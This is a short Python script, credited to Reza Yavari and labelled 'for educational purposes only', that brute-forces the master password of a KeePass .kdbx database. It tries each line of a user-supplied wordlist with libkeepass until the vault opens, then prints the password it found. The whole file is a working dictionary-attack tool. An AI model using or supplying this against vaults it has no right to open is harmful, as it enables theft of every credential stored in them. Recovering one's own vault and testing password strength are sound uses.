# Keepass Brute Force without special library
# Reza Yavari , 01-01-2021
# for educational purposes only
import libkeepass
import logging
import sys

filename = input(
    "Please enter file name with Address for example : D:\Keepass\Yavarich.kdbx \n")
if filename == "":
    print("File not found")
    sys.exit()

fdA = input(
    "Please enter password list name with Address for example : D:\Keepass\dic.txt \n")
if fdA == "":
    print("File not found")
    sys.exit()
else:
    fd = open(fdA, 'r')
print("Please wait... \n")
lines = []
for line in fd:
    lines.append(line.replace("\n", ""))
for x in lines:
    try:
        with libkeepass.open(filename, password=x) as kdb:
            str = kdb.pretty_print()
            print("Password is : ", x)
            break
    except BaseException as e:
        logging.info(x)
else:
    print("Password is not found!, please try with other password list")
